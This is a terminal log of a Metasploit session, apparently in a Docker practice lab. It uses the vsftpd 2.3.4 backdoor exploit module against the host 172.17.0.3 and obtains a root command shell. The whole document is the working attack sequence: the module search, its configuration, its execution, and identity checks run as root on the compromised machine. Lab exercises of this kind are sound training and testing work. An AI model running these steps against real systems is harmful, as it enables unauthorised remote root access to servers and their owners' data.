```bash
┌──(root㉿38095a406ad0)-[/]
└─# msfconsole
Metasploit tip: You can upgrade a shell to a Meterpreter session on many 
platforms using sessions -u <session_id>
                                                  
 ______________________________________
/ it looks like youre trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2504 exploits - 1291 auxiliary - 393 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > option
[-] Unknown command: option. Did you mean options? Run the help command for more details.
smsf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:por
                                       t][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/d
                                       ocs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 172.17.0.3
RHOST => 172.17.0.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 172.17.0.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.3:21 - USER: 331 Please specify the password.
[+] 172.17.0.3:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
shell /bin[*] Command shell session 1 opened (172.17.0.2:44993 -> 172.17.0.3:6200) at 2025-05-14 07:44:26 +0000

/bash
[*] Trying to find binary 'python' on the target machine
[-] python not found
[*] Trying to find binary 'python3' on the target machine
[-] python3 not found
[*] Trying to find binary 'script' on the target machine
[*] Found script at /usr/bin/script
[*] Using `script` to pop up an interactive shell
whoami;id;group
whoami;id;group
root
uid=0(root) gid=0(root) groups=0(root)
bash: group: command not found
root@dockerlabs:/tmp/vsftpd-2.3.4-infected# 

```